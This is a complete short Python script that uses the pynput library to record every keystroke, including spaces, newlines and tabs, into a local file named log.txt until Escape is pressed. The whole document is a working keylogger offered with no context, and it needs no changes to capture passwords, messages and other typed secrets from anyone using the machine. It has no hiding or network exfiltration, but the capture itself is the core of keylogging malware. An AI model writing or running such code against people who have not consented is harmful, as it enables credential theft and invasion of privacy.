from pynput import keyboard

log_file = open("log.txt", "a", encoding="utf-8")
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t"
}

def on_press(key):
    try:
        log_file.write(key.char)
    except AttributeError:
        char = special_keys.get(key, "") 
        if char:
            log_file.write(char)
    
    log_file.flush()

def on_release(key):
    if key == keyboard.Key.esc:
        print("Closing...")
        log_file.close()
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()